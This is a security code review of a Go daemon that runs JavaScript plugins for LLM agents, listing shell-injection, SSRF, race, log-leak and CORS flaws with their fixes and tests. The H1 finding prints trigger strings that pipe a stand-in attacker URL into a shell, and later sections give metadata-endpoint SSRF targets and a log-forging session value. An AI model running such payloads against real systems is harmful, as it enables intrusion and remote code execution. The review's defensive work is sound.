# Adversarial code review — `mcphe` Go daemon

Date: 2026-11-22
Scope: every non-test Go file in the module (5,483 lines):

```
main.go  configguard.go
config/{config,resolve,env_resolver,file_resolver,vault_*}.go
plugin/{plugin,checksum}.go   integrity/checksum.go
server/bridge.go
transport/transport.go   auth/{token,revoker}.go
host/host.go   host/{fs,exec,env,httpclient,path,url,crypto,logger,time}/*.go
```

Method: read only, nothing executed. For each function I traced branches, error/cancel/
timeout behaviour, goroutine ownership of fields, attacker- or agent-controlled inputs, and
restart / second-instance / mid-operation behaviour. Where a conclusion depends on code
outside this module (`goja`, `modelcontextprotocol/go-sdk`) I read that dependency's source
and say so explicitly.

Agent-controlled means: a tool argument that an LLM produced from prompt-influenced content,
which reaches plugin JS unchanged. That is the main untrusted input path in this daemon, so
most findings are reachable from it.

---

## Status: H1–H5 and M1–M11 fixed

All five HIGH and all eleven MEDIUM findings are fixed, each with a regression
test (Go, plus end-to-end Python cases through the real binary). `go test ./...`,
`go test -race ./plugin/ ./host/... ./auth/ ./transport/ ./config/` and
`python3 -m tests` (162 cases) pass. The LOW table is untouched.

### HIGH

| # | Fix | Where | Test |
|---|---|---|---|
| H1 | `sh -c` replaced by an argv splitter (`splitCommand`: quoting only, no expansion); only `argv[0]` is compared to `allowed_commands` and only it is executed. Child env = `allowed_env_vars` + a small pass-through list (`PATH`, `HOME`, `LANG`, `LC_*`, …). Output capped at 1 MiB, overflow kills the child. | `host/exec/exec.go` | `exec_test.go` (`ShellMetacharactersAreLiteral`, `ChildEnvIsScrubbed`, `OutputIsBounded`, `splitCommand`); `sandbox.exec-no-shell`, `sandbox.exec-substitution-literal`, `sandbox.exec-env-scrubbed` |
| H2 | `Plugin.mu` held across `Set("host")`, `Set("require")` and `Call`. Serialising costs no I/O parallelism: host functions are synchronous. | `plugin/plugin.go` | `TestCallTool_ConcurrentCallsDoNotShareTheHostObject` (fails without the lock: "index out of range", nil deref) |
| H3 | Directory indexed by the *statically* detected exported name (`DetectPluginName`); only configured plugins are read and run; `verifyEntry` checks the exact bytes before `RunString`; a manifest additionally verifies every `.js` in the directory, unconfigured or not. The file must export the name the config resolved it by. | `plugin/plugin.go` | `TestLoadPlugins_DoesNotExecuteUnconfiguredFiles`, `..._ChecksumIsCheckedBeforeTheModuleRuns`, `..._RejectsAFileThatExportsAnotherName`; `discover.unconfigured-not-executed`, `checksum.before-execution` |
| H4 | `CheckRedirect` on the per-plugin client: every hop must be in `allowed_domains`; chains capped at 5. | `host/httpclient/httpclient.go` (`clientFor`) | `TestHTTPGet_RedirectOffAllowListIsRefused`, `..._RedirectOnAllowListIsFollowed`, `..._RedirectLoopIsCapped` |
| H5 | `randomBytes` and `readStream` chunk size range-checked at the boundary (NaN/±Inf/huge/0 rejected); `CallTool` recovers any remaining Go panic into a tool error and disables that instance. | `host/crypto/crypto.go`, `host/fs/fs.go`, `plugin/plugin.go` | `crypto_test.go`, `fs_test.go` (`ReadStream_RejectsBadChunkSize`), `TestCallTool_GoPanicIsContainedAndPoisonsThePlugin`; `tool.panic-contained` |

### MEDIUM

| # | Fix | Where | Test |
|---|---|---|---|
| M1 | The eight `host.http` entry points collapse into one `do(ctx, method, …)`; the domain, `allowed_http_methods` and `allowed_headers` checks live there and nowhere else. The nested `{"headers": {...}}` form is gated on what it contains, not on the wrapper's name. | `host/httpclient/httpclient.go` | `TestConvenienceHelpersEnforceMethodAllowList`, `TestConvenienceHelpersEnforceHeaderAllowList`; `sandbox.http-method-convenience`, `sandbox.http-header-denied` |
| M2 | Every read that a plugin, a config value or a manifest can point at is capped *while* reading: response bodies 32 MiB, `fs.readFile` 32 MiB, plugin sources 8 MiB (`readPluginFile`, used by the loader, `require()` and the checksum code), manifests and digest targets 8 MiB, `file://` values 1 MiB. An overrun is an error, never a silent truncation. | `host/httpclient`, `host/fs`, `plugin/sourcefile.go`, `integrity/checksum.go`, `config/file_resolver.go` | `TestHTTPGet_OversizedBodyIsRefused`, `TestReadFile_RejectsAFileOverTheLimit`, `TestLoadManifest_RejectsAFileOverTheLimit`, `TestFileResolver_RejectsAFileOverTheLimit`; `sandbox.fs-read-too-large` |
| M3 | `tools/call` logs argument **names** (`argumentNames`), not values. `MaskKeyValue` matches substrings (`auth`, `key`, `token`, `secret`, `cookie`, `password`, `credential`, `signature`, `session`) instead of four exact names. URLs are logged through `redactURL` (userinfo dropped, sensitive query values masked). `auth.Validate`'s errors no longer quote any part of the token. | `plugin/plugin.go`, `config/config.go` (`IsSensitiveName`), `host/httpclient/httpclient.go`, `auth/token.go` | `TestArgumentNames`, `TestIsSensitiveName`, `TestMaskKeyValueWidensBeyondTheOldFourNames`, `TestRedactURL`, `TestValidateErrorsNeverContainTheToken`; `tool.args-not-logged` |
| M4 | `/rpc/openapi.json` is served from inside the same handler chain as `/rpc` (so it passes through CORS and `ValidateToken`) and accepts `GET`/`HEAD` only; anything else is `405` with an `Allow` header. | `main.go` (`runHTTP`) | `transport.openapi-auth`, `transport.openapi-auth-ok`, `transport.openapi-method` |
| M5 | A real `http.Server` with `ReadHeaderTimeout: 10s` and `IdleTimeout: 120s` (`WriteTimeout` stays zero so SSE still works), `signal.NotifyContext` for `SIGINT`/`SIGTERM`, and `srv.Shutdown` with a 30 s grace period before the pid file is removed. `runHTTP` now returns normally, so the deferred `stopWatch` runs. `runStdio` gets the same context so a signal exits through `removePidFile`. | `main.go` | `startup.graceful-shutdown` |
| M6 | `fs.writeFile` and `fs.writeStream` write a temp file beside the destination, `fsync`, apply the existing file's mode (or 0644), close, then rename. A failing producer leaves the original untouched and no temp file behind. | `host/fs/fs.go` (`writeFileAtomic`, `createTempBeside`, `finishTemp`) | `TestWriteStream_KeepsTheOriginalWhenTheCallbackFails`, `..._EmptyStreamWritesAnEmptyFile`, `..._ReplacesContentOnSuccess`, `TestWriteFile_PreservesAnExistingModeAndLeavesNoTemp`; `sandbox.fs-write-atomic`, `sandbox.fs-write-atomic-success` |
| M7 | `writeEntries` uses `os.CreateTemp` in the destination directory (no fixed `.tmp` name). `Revoke`/`UnrevokeIdentity`/`purge` run their read-modify-write under an `O_EXCL` lock file with a 5 s timeout and 30 s staleness takeover. `Watch`'s stop function is `sync.Once`-guarded and a non-positive interval falls back to 5 s instead of panicking in `time.NewTicker`. | `auth/revoker.go` | `TestConcurrentRevokesDoNotLoseEntries`, `TestWatchStopIsIdempotent`, `TestWatchWithNonPositiveIntervalDoesNotPanic`; `token.revoke-concurrent` |
| M8 | CORS is now the outermost middleware, so the preflight is answered before auth. `cors_origin: "*"` requires the new `cors_allow_any: true` (otherwise startup fails, and `CORSMiddleware` itself refuses to emit the wildcard). A request whose `Origin` names a different origin is refused `403` on state-changing methods — the server-side half of CORS, not just a response header. | `main.go`, `transport/transport.go` | `TestPreflightIsAnsweredWithoutAToken`, `TestStateChangingRequestFromAnotherOriginIsRefused`, `TestWildcardOriginNeedsAnExplicitOptIn`; `transport.preflight-allowed`, `transport.cross-origin-post`, `startup.cors-wildcard` |
| M9 | `transport.SessionIDFromRequest` accepts only `[A-Za-z0-9_-]{1,128}`; anything else is treated as absent (and logged as malformed), so it can neither route a request to the SSE handler nor appear in a log line. `config.LogfWithContext` escapes control characters in the identity/session fields as defence in depth. | `transport/transport.go`, `config/config.go` (`escapeLogField`) | `TestValidSessionID`, `TestSessionIDFromRequestDropsAForgedValue`; `transport.session-id-forgery` |
| M10 | `host.server.config(name)` ignores any name other than the caller's own (and logs it). A plugin entry whose `config:` resolves to the daemon's own `config.yaml` is refused at load, so `token_secret` can no longer be pulled into a plugin's `host.config`; the shipped `config.yaml` now uses an `options:` block, and `plugins/proxmox.js` reads `host.config.options`. | `host/host.go`, `config/config.go` (`refuseSelfReference`) | `TestServerConfigOnlyExposesTheCallersOwnPlugin`, `TestPluginConfigCannotPointAtTheDaemonConfig`, `TestPluginConfigMayReadAnotherFile`; `sandbox.server-config-scope`, `startup.plugin-config-self-reference` |
| M11 | `HTTPTimeoutSecondsFor` validates the plugin value and the global one against `0 < seconds <= 3600`, falling back down the chain to a 15 s default. `0` no longer becomes `http.Client{Timeout: 0}` (no timeout at all). | `config/config.go` | `TestHTTPTimeoutSecondsFor`; `sandbox.http-timeout-invalid` |

Behaviour changes worth knowing about:

* `allowed_commands` entries name **executables** (this is what the code always
  matched; the README used to claim full command strings). Shell features —
  globs, pipes, `$(...)`, redirection — no longer work through `runCommand`;
  shell builtins (`cd`, `export`) are no longer runnable.
* A `.js` file in `plugin_dir` that no config entry enables is no longer executed
  (and so can no longer fail startup). With `plugin_checksum_manifest` set, an
  unlisted file is still a startup failure.
* Tool calls to one plugin instance are serialised. A host call that blocks for a
  long time (a 300 s HTTP timeout, a slow command) now queues that plugin's other
  calls behind it instead of corrupting the VM.
* `host.http.post`/`put`/`patch`/`delete`/`head`/`options` are now subject to
  `allowed_http_methods` and `allowed_headers`. A config that listed `["GET"]`
  but relied on `host.http.post` will start refusing those calls — which is what
  the setting always said.
* CORS moved outside auth. `cors_origin: "*"` without `cors_allow_any: true` is
  now a startup failure. Browsers can reach the server; a cross-origin `POST`
  from an unlisted origin gets `403`.
* `fs.writeFile`/`fs.writeStream` replace the destination by rename, so writing
  *through* a symlink now replaces the symlink rather than the file it points
  at. Both preserve the destination's existing mode instead of forcing 0644.
* An empty `writeStream` (first callback returns `""`) still writes an empty
  file: that is a request for an empty file, not a failure. What changed is that
  a callback that *throws* no longer leaves the destination truncated.
* A plugin's `config:` key may still name a plugin-specific file, but not the
  daemon's own `config.yaml`.
* `host.server.config("<other plugin>")` returns only `mcp-version`/`mcp-commit`
  and logs a warning, rather than throwing — an existing plugin that probes
  another name degrades instead of breaking.

Not done, in the order I would take them next: the LOW table (L2 constant-time
legacy token, L3 negative TTLs, L4 single-instance pid file, L6 trailing newline
in `file://`, L9 non-UTF-8 `randomBytes`, L11 `chunkSize: 0`, L12 the 64 KB
scanner limit, L13 revocation key validation, L19 port restriction, L20
`DetectPluginName`). Two leftovers from H1 that the fixes do not cover: a
cancelled context kills the child but not its grandchildren (no process-group
kill), and there is still no per-command timeout of its own. One known residual
from M2: the caps are per read, so N concurrent calls can still hold N × cap in
memory — bounding that needs a per-plugin budget rather than a per-read limit.

---

## HIGH

### H1 — `host.exec.runCommand` is a shell, so the command allowlist is decorative (RCE)

**Where:** `host/exec/exec.go:RunCommand` (lines 26–52), exposed as `host.exec.runCommand`
(`host/host.go:224`), shipped plugin `plugins/run_command.js`.

**Definitely wrong.** `commandName()` extracts the first whitespace-delimited token and
compares it to `allowed_commands`. The *whole original string* is then handed to
`exec.CommandContext(ctx, "sh", "-c", command)` (line 45; `cmd /C` on Windows). The allowlist
therefore constrains only the first word of an arbitrary shell program.

**Trigger.** With `allowed_commands: ["git"]`, any of these pass the gate and execute:

```
git; curl http://attacker/x | sh
git $(curl http://attacker/x)
git `id`
git --upload-pack=touch${IFS}/tmp/pwned
git && env
```

The last one is a second-order break: `sh -c` inherits the daemon's whole environment, so a
single allowlisted command defeats `allowed_env_vars` (H-adjacent: `VAULT_TOKEN`,
`GITLAB_API_KEY`, … all readable). `configuration/config-8000.yaml` ships an
`allowed_commands:` block, so this is a live configuration shape, not a hypothetical.

**Minimal fix.** Do not involve a shell. Tokenise the string yourself (or require a JSON
array argument), require `argv[0]` to be in the allowlist, and run
`exec.CommandContext(ctx, argv[0], argv[1:]...)`. If a shell is genuinely required, allowlist
exact full command strings and reject `; | & $ ( ) ` \n` before exec — but argv form is the
only version of this that is not a foot-gun. Note that `host/httpclient` and `host/fs` already
use argv-free, allowlist-per-item APIs; `exec` is the odd one out.

**Related, same function:** `CombinedOutput()` buffers unbounded output (`yes` → OOM);
cancelling `ctx` kills `sh` but not its children (orphaned grandchildren keep running after a
client disconnect); there is no timeout of its own if `ctx` has no deadline.

---

### H2 — one `goja.Runtime` per plugin, shared by every concurrent request, with no lock

**Where:** `plugin/plugin.go:CallTool` (601–681) — `plugin.VM.Set("host", …)` (621),
`plugin.VM.Set("require", …)` (634), `plugin.Call(...)` (648). `Plugin.VM` is a
`*goja.Runtime` created once in `loadPluginAs` (460) and stored on the shared `*Plugin`
(575). `PluginManager.byName` hands the same pointer to every request.

**Definitely wrong.** `goja.Runtime` is documented as not safe for concurrent use, and this
is the only package in the repo with no mutex (`grep sync.Mutex` finds exactly one, in
`auth/revoker.go`). Tool calls really do overlap:

* `mcp/server.go:1445` calls `jsonrpc2.Async(ctx)` for every request where `req.IsCall()`.
* `jsonrpc2/conn.go:handleAsync` spawns `go func(){ c.handler.Handle(ctx, req) }()` per
  queued request and does **not** wait for it (`Async` closed the releaser channel, so the
  loop immediately dequeues the next request).

So a single client pipelining two `tools/call` requests — exactly what an agent does when it
batches independent calls — runs two `CallTool` bodies at once against one VM. Two sessions
concurrently is trivially the same.

**Consequences:** `fatal error: concurrent map writes` (process death), corrupted VM state,
or silent cross-request contamination: `host`/`require` are re-`Set` per call, so call B can
replace the host object while call A's JS is executing, and any module-level state a plugin
keeps (a cache, a `let currentUser`, a stashed `host` reference) is shared between users.

**Minimal fix.** Add `mu sync.Mutex` to `Plugin` and hold it across the three `Set`/`Call`
calls in `CallTool`. That serialises tool calls per plugin instance (host functions are
synchronous, so there is no I/O-concurrency win to lose). If per-call parallelism is wanted
later, the correct shape is a VM pool or a VM per call — not an unlocked shared runtime.

---

### H3 — every `.js` in `plugin_dir` executes at startup, whether enabled or not, and before its checksum is checked

**Where:** `plugin/plugin.go:LoadPlugins` phase 1 (97–109) loads *every* file returned by
`filepath.Glob(dir/*.js)` to discover exported names. `loadPluginAs` runs the module body at
line 489 (`vm.RunString(script)`) and only verifies the checksum at line 518 — the comment at
448–453 acknowledges the ordering and argues the mismatch "aborts startup either way", but the
code has already run by then.

**Definitely wrong**, in two independent ways:

1. **Unconfigured code runs.** A file with no entry in `cfg.Plugins` is still executed
   (phase 2b only decides whether to *register* it). Dropping `evil.js` into `plugin_dir`
   gets arbitrary JS executed at daemon start. The load-time `host` object is built with
   `tempName = filepath.Base(path)` (472–476), which matches no config entry, so all
   `allowed_*` lists are empty and the fs/http/exec calls fail closed — good — but the JS
   itself runs: infinite loops, `require()` of a missing module, and any Go panic it can
   provoke (see H5) are all reachable before any gate has been consulted.
2. **`require_plugin_checksums: true` does not prevent it.** `requireDeclared` is only called
   from `addInstance`, which is after execution. The tampered plugin's top-level code runs,
   and only then does `verifyChecksum` reject it.

A third consequence, availability rather than security: any unreadable or syntactically
invalid `.js` in the directory aborts startup even if it is not configured (`LoadPlugins`
returns the error), so a stray file is a startup DoS.

**Minimal fix.** Load only what is configured: iterate `cfg.Plugins` (plus the legacy
`tools` map), resolve each entry to `plugin_dir/<source>.js`, verify, then execute. If
name-based discovery must stay, hash the file and check it against the manifest/declared set
*before* `RunString`, using `DetectPluginName` for the name. Either way the invariant should
be: **no bytes reach `RunString` until they have been verified.**

---

### H4 — the HTTP client follows redirects, so `allowed_domains` does not bound where requests go (SSRF)

**Where:** `host/httpclient/httpclient.go:clientFor` (666–672) returns
`&http.Client{Timeout: …, Transport: httpClient.Transport}` with no `CheckRedirect`.
`isDomainAllowed` is applied to the *first* URL only (e.g. line 34, 117, 187).

**Definitely wrong.** `net/http` follows up to 10 redirects by default. Any allowlisted host
that 302s elsewhere — a normal open redirect, a link shortener, a wiki, a `gitlab` instance's
`/-/redirect` — takes the request off-allowlist. `http://169.254.169.254/latest/meta-data/`
(cloud metadata), `http://127.0.0.1:8001/rpc` (this daemon's own API), `http://10.0.0.5:9200`
(an internal service not in `allowed_domains`) all become reachable, and the response body is
returned to the plugin and on to the model.

Second-order: on a cross-*domain* redirect Go strips `Authorization`/`Cookie`, but **keeps
custom headers** (`X-API-Key`, `PRIVATE-TOKEN`, …). So a plugin that sends a credential
header to an allowlisted host has it forwarded to whatever host that redirect names.

**Minimal fix.**

```go
CheckRedirect: func(req *http.Request, via []*http.Request) error {
    if !isDomainAllowed(req.URL.Hostname(), cfg.AllowedDomainsFor(pluginName)) {
        return fmt.Errorf("redirect to %s is not allowed", req.URL.Hostname())
    }
    if len(via) >= 5 { return errors.New("too many redirects") }
    return nil
},
```

This must be set on the client, not the request, and it must apply to all eight functions
(they all funnel through `clientFor`, so one change covers them).

---

### H5 — a Go panic inside a host function kills the whole process

**Where:** `host/crypto/crypto.go:RandomBytes` (9–15) — `make([]byte, n)` with no validation;
`host/fs/fs.go:ReadStream` (121–162) — `chunkSize = int(size)` from JS options (137–142),
then `make([]byte, chunkSize)` (142).

**Definitely wrong.** `host.crypto.randomBytes(-1)` and
`host.fs.readStream(p, {chunkSize: -1}, cb)` panic with `runtime.Error`
(`makeslice: len out of range`). goja deliberately re-panics non-`*Exception` values
(`goja/vm.go:840` → `panic(arg)`), so the panic is not converted into a JS throw and is not
recoverable by plugin code.

Nothing recovers it either: the handler runs in the bare goroutine that
`jsonrpc2/conn.go:handleAsync` spawns, which is **not** a `net/http` goroutine, so `net/http`'s
per-connection recover does not apply. The process exits with a stack trace.

The existing `recover()`s do not cover this path: `plugin/safeExport` (195–207) only wraps
`Export()`; `server/bridge.go:addTool` (113–118) only wraps registration.

**Minimal fix.** Validate at the boundary — `n < 0 || n > maxRandomBytes` and
`chunkSize <= 0 || chunkSize > maxChunk` → return an error. Then add a belt-and-braces
`defer func(){ if r := recover(); r != nil { err = fmt.Errorf("plugin panic: %v", r) } }()`
at the top of `PluginManager.CallTool`, and mark that plugin's VM as poisoned (a VM that
panicked mid-execution is not safe to reuse).

---

## MEDIUM

### M1 — `allowed_http_methods` and `allowed_headers` are enforced in `Request` only

**Fixed.** All eight entry points funnel into `httpclient.do`, which is the only
place the domain, method and header gates exist. See the MEDIUM table above.

**Where:** `host/httpclient/httpclient.go`. `Request` checks `isMethodAllowed` (38) and
`IsHTTPReqHeaderAllowed` (56). `Get` (102), `Post` (172), `Patch` (242), `Put` (312),
`Delete` (382), `Options` (452), `Head` (522) check **neither** — they only check
`isDomainAllowed`.

**Definitely wrong (gate bypass).** `allowed_http_methods: ["GET"]` (as configured for
`get_ip` in `config.yaml`) does not stop `host.http.post(...)`; `allowed_headers` does not
stop `host.http.post(url, {"X-Exfil": data})`. This is defect class "early returns that bypass
a gate the comments call the choke point" — here, seven sibling entry points that skip it.

**Minimal fix.** Hoist the two checks into `clientFor`'s callers, or better, collapse the eight
near-identical functions into one `do(ctx, method, …)` and keep a single gate. The duplication
is itself the bug: `Put`'s log lines even say `"HTTPGet header inbound"` (339).

### M2 — unbounded reads from network and disk

**Fixed.** Every read named here now goes through a limit applied while reading,
with an overrun reported as an error. See the MEDIUM table above.

`io.ReadAll(resp.Body)` in all eight `httpclient` functions (84, 154, 224, 294, 364, 434,
504, 574) with no cap; `os.ReadFile` in `fs.ReadFile` (72), `plugin.loadPluginAs` (433),
`makeModuleLoader` (352), `config.FileResolver.Resolve` (18), `integrity.LoadManifest` (165).
A 10 GB response from an allowlisted host, or `file:///dev/zero` in a config value, is an
unbounded allocation. Use `io.LimitReader` / an explicit max-size check with a clear error.

### M3 — secret leakage into logs

**Fixed.** Argument names instead of values, substring-based masking, URL
redaction, and token errors that quote nothing. See the MEDIUM table above.

* `plugin/plugin.go:CallTool` line 602 logs **raw tool arguments** at level 2
  (`"Calling tool %s with raw args %s"`), and again at 653. Tool arguments routinely carry
  passwords, tokens and PII. The shipped `config.yaml` runs at `verbosity_level: 4`, so this
  is on by default there.
* `config/config.go:MaskKeyValue` (521–527) masks exactly `authorization`, `cookie`, `token`,
  `password`. It does **not** mask `x-api-key`, `api-key`, `apikey`, `private-token`,
  `proxy-authorization`, `set-cookie`, `x-auth-token`, `secret`. `httpclient` uses it for
  every header it logs (55, 61, 66, …), so `PRIVATE-TOKEN` is printed in clear at level 4.
* Every `httpclient` function logs the full `urlStr` (28, 111, 181, …). A plugin that puts a
  credential in the query string (`?api_key=…`) or uses `user:pass@host` writes it to stderr
  verbatim.
* `auth/token.go:Validate` embeds raw token segments in error strings (`76`, `85`, `89`, `95`,
  `100`), which `transport.ValidateToken:45` logs.

Fix: log argument *names* (or a redacted copy) not values; extend `MaskKeyValue` to a
substring match (`auth`, `key`, `token`, `secret`, `cookie`, `password`, `credential`);
redact `url.User` and known-sensitive query keys before logging.

### M4 — `/rpc/openapi.json` bypasses authentication and CORS entirely

**Fixed.** The route is served from inside the `/rpc` handler chain, so it passes
through CORS and `ValidateToken`, and only `GET`/`HEAD` are accepted.

**Where:** `main.go:489` registers `plugin.OpenapiHandler` directly on the `mux`;
`main.go:490` registers `/rpc` with the `finalHandler` chain (CORS + `ValidateToken`). The
OpenAPI route is a separate, exact pattern, so it never sees either middleware.

Any unauthenticated client gets the complete tool inventory: names, descriptions, input
schemas, versions, `_meta`. `OpenapiHandler` also accepts **any** HTTP method and returns the
full list for `DELETE /rpc/openapi.json`. Put it behind `finalHandler` (register it as a
sub-path handled by the same chain) and require `GET`/`HEAD`.

### M5 — no `http.Server`, therefore no timeouts, no graceful shutdown, no signal handling

**Fixed.** `ReadHeaderTimeout`/`IdleTimeout`, `signal.NotifyContext`, and a bounded
`Shutdown` before the pid file is removed; `runHTTP` returns normally so its
deferred cleanup runs.

**Where:** `main.go:503` and `main.go:511` call `http.ListenAndServeTLS` / `http.ListenAndServe`
with a bare `ServeMux`. There is no `&http.Server{}` anywhere (`grep` confirms), so
`ReadHeaderTimeout`, `ReadTimeout`, `IdleTimeout` are all zero = unlimited.

Consequences: a slowloris client holds connections open indefinitely
(`ReadHeaderTimeout` is the specific missing defence); `SIGTERM`/`SIGINT` terminate the process
with no cleanup, so `removePidFile` never runs and in-flight tool calls are severed mid-write;
`defer stopWatch()` at `main.go:479` is unreachable (the function never returns normally).

Fix: build an `http.Server` with `ReadHeaderTimeout: 10*time.Second` (leave `WriteTimeout`
zero so SSE still works, or set a generous one), add `signal.NotifyContext`, and
`srv.Shutdown(ctx)` with a bounded grace period before removing the pid file.

### M6 — `fs.WriteStream` destroys the destination before it knows it can write it

**Fixed.** Both write paths go through a temp file in the destination directory,
`fsync`, mode preservation, and a rename. A throwing callback leaves the
original file byte-identical.

The empty-stream half of the finding is **not** changed, deliberately: a first
callback that returns `""` is the documented end-of-stream signal, so a stream
with no chunks is a request to write an empty file and that is what it does. The
difference is that this decision is now reached only after the producer has run
cleanly, so it can no longer be confused with — or destroy the data on the way to
— the failure case.

**Where:** `host/fs/fs.go:WriteStream` (164–192). `os.Create(path)` truncates immediately
(169); the content only arrives from `callback()` (176). If the callback errors, or returns
`""` on the first call (the documented end-of-stream signal), the original file is already
gone and the result is an empty file.

Also: `WriteFile` (85) is a non-atomic `os.WriteFile` at 0644 — a crash mid-write leaves a
truncated file, and the mode silently drops any exec bit the target had.

Fix: write to `path + ".tmp"` in the same directory, `os.Rename` on success, remove on
failure; preserve the existing file's mode when overwriting.

### M7 — revocation file: fixed temp name, no lock, double-close

**Fixed.** `os.CreateTemp` for the rewrite, an `O_EXCL` lock around each
read-modify-write cycle (5 s timeout, 30 s staleness takeover), `sync.Once` for
the stop function, and an interval guard before `time.NewTicker`.

**Where:** `auth/revoker.go`.

* `writeEntries` (257) uses `r.path + ".tmp"` — a **fixed** name. Two concurrent
  `mcphe token revoke` processes write the same temp file and both rename it; one can rename a
  half-written file into place. `os.CreateTemp` in the same directory fixes it.
* `Revoke`/`Unrevoke`/`UnrevokeIdentity`/`purge` are read-modify-write (read → mutate →
  rewrite) with no file lock, so concurrent invocations lose updates. Take an `O_EXCL` lock
  file (or `flock` on the revocation file) around the pair.
* `Watch`'s returned stop function is `func(){ close(done) }` (78) — calling it twice panics;
  and `time.NewTicker(interval)` (64) panics for `interval <= 0`, which is unguarded on a
  public API. Use `sync.Once` and validate the interval.

### M8 — CORS is inside the auth middleware, so preflight is always rejected

**Fixed.** CORS is outermost; `*` requires `cors_allow_any: true` (startup failure
otherwise); a mismatched `Origin` is `403` on state-changing methods.

**Where:** `main.go:465` wraps the handler with `CORSMiddleware`, then `main.go:481` wraps
*that* with `ValidateToken`. Auth is therefore outermost: an `OPTIONS` preflight with no
`Authorization` header is answered `401` at `transport/transport.go:22` and never reaches the
CORS handler's `if r.Method == http.MethodOptions` short-circuit (line 70) — which is dead
code. Browser clients can never talk to this server cross-origin.

This is a latent security issue too: the obvious "fix" (move CORS outside auth) makes
`cors_origin: "*"` (accepted verbatim, line 65) meaningful, and `*` plus a bearer token is one
misconfiguration away from a cross-site tool-invocation channel. Fix the ordering *and* refuse
`*` unless an explicit `cors_allow_any: true` is set, and add an `Origin` check on
state-changing methods.

### M9 — attacker-chosen `sessionId` is written into log lines unescaped

**Fixed.** `SessionIDFromRequest` accepts `[A-Za-z0-9_-]{1,128}` only and drops
anything else, so the value can neither forge a log line nor steer routing; log
fields are escaped as a second layer.

`transport/transport.go:27-33` and `main.go:432-438` take the session id from
`r.URL.Query().Get("sessionId")`. `config.LogfWithContext` (182–211) interpolates it with
`%s` in the middle of a line. Query values are percent-decoded, so
`?sessionId=x%0a2026-Nov-22%20[WARN]%20admin%20-%20forged` injects a fabricated log line in
text mode. (JSON mode escapes it.) Additionally `main.go:446` uses the same value to *route*
to the SSE handler, so a client can steer which transport handles its POST.

Fix: reject session ids outside `[A-Za-z0-9_-]{1,128}`, and quote/escape them at log time.

### M10 — cross-plugin configuration disclosure

**Fixed.** `server.config(name)` returns the caller's own block only, and a
plugin entry whose `config:` names the daemon's own config file is refused at
load. The shipped config and `proxmox.js` now use an `options:` block.

**Where:** `host/host.go:240-254`. `host.server.config(name)` takes an **arbitrary** name from
plugin JS and returns `cfg.Plugins[name]` verbatim. Plugin A can therefore read plugin B's
`options` block — which is where this project tells operators to put credentials
(`gitlabApiKey`, `ApiUrl`, tokens). `host.config` (line 44–52) does the same for its own entry,
which is intended, but the entry includes the whole config block, so `proxmox_api`'s
`config: "file:///…/config.yaml"` in the shipped `config.yaml` pulls the daemon's own config —
including `token_secret` — into that plugin's `host.config`.

Fix: make `server.config(name)` reject any name other than `pluginName`, and stop treating
`host.config` as a place for secrets (expose an explicit `options` sub-object instead).

### M11 — `http_timeout_seconds: 0` silently means "no timeout"

**Fixed.** Values outside `0 < seconds <= 3600` fall through to the global value
and then to a 15 s default.

`config/config.go:HTTPTimeoutSecondsFor` (609–624) returns a plugin-level value unvalidated;
`httpclient.clientFor` (666) turns it into `http.Client{Timeout: 0}`, which is *no* timeout,
not the documented default. Same for negatives (immediate failure). Validate
`0 < seconds <= 3600` and fall back to the global default on a bad value.

---

## LOW

| # | Where | Issue |
|---|---|---|
| L1 | `config.yaml:6` | A real-looking `token_secret` is committed in plaintext. Rotate it and move it to `env://`. |
| L2 | `transport/transport.go:48` | Legacy bearer token compared with `==` (not constant time), while the HMAC path correctly uses `hmac.Equal`. Use `subtle.ConstantTimeCompare`. |
| L3 | `main.go:374-391` | `parseTokenDuration` accepts `-1h`, `NaNd`, `1e400d`; `time.Duration(float)` overflow yields a negative TTL. `mcphe token revoke bob -1h` writes an already-expired entry that `readEntries` (219) prunes on the next reload — the revocation silently vanishes. Reject `ttl <= 0` and non-finite values. |
| L4 | `main.go:531-541`, `config.go:508` | No single-instance guard. The pid file is written unconditionally (no flock, no live-pid check), so a second instance overwrites it and the first instance's `removePidFile` then deletes the *second's* file. |
| L5 | `config/resolve.go:14-27` | `resolvers` is a process-global map mutated by `RegisterResolver` with no lock, and `LoadConfigBytes` registers the vault client globally (140). A second config load in the same process silently inherits the first's client. Harmless today (one load per process), wrong the moment a reload exists. |
| L6 | `config/file_resolver.go:14` | No size cap (`file:///dev/zero` hangs startup), and the trailing newline is preserved, so `token_secret: file:///etc/secret` includes `\n`. |
| L7 | `config/vault_client_role.go:29` | `token.Auth.ClientToken` is dereferenced without a nil check; a 204/empty login response panics at startup. |
| L8 | `config/vault_client_real.go:16` | No client timeout; `vault_addr: http://…` sends the token in clear text (no scheme check, no TLS verification policy). |
| L9 | `host/crypto/crypto.go:14` | `string(b)` of raw random bytes: goja converts invalid UTF-8 to U+FFFD, so `randomBytes` is not uniform and loses entropy if used for nonces/tokens. Return hex or base64. |
| L10 | `host/host.go:79-82` | `host.sleep` calls `time.Sleep` directly, bypassing the validated `host/time.Sleep` (which rejects negatives), and has no cap or cancellation. |
| L11 | `host/fs/fs.go:142-149` | `chunkSize: 0` produces `make([]byte,0)`; `Read` returns `n=0, err=nil` and the loop breaks — a silent empty read reported as success. |
| L12 | `auth/revoker.go:206` | `bufio.Scanner`'s 64 KB line limit: one long line makes every reload fail permanently while the stale snapshot stays live (`Watch` only logs). |
| L13 | `auth/revoker.go:110-129` | Revocation keys are unvalidated. A username containing `:` (allowed by `token create`) makes `alice:laptop` both a blanket username and a label key; a username containing whitespace breaks the file format entirely. |
| L14 | `main.go:429`, `host/host.go:24` | `context.WithValue(ctx, "http_headers", …)` uses a bare `string` key — collision risk and a `go vet` SA1029 violation. Use a typed key. |
| L15 | `plugin/plugin.go:76` | `filepath.Glob(filepath.Join(dir, "*.js"))` — glob metacharacters in `plugin_dir` change the match set; a directory named `*.js` breaks startup. |
| L16 | `main.go:544` | `isLoopback` misses `localhost` (false-positive warning) and any hostname that resolves to loopback. |
| L17 | `main.go:57-73` | The root check runs *after* `guard.load`, so a root invocation parses the config and performs a Vault login before being rejected. |
| L18 | `host/logger/logger.go` | `NewLogger` returns a `NoOpLogger` and is wired to nothing — a stub presented as an implementation. `host/env/env.go:31-56` has three unused `isXAllowed` helpers. |
| L19 | `host/httpclient/httpclient.go:596` | `strings.TrimSuffix(hostname, ":")` is a no-op (`Hostname()` never has a trailing colon); it looks like a defence but is not. There is also no port restriction, so `allowed_domains: ["x"]` permits `x:8443`. |
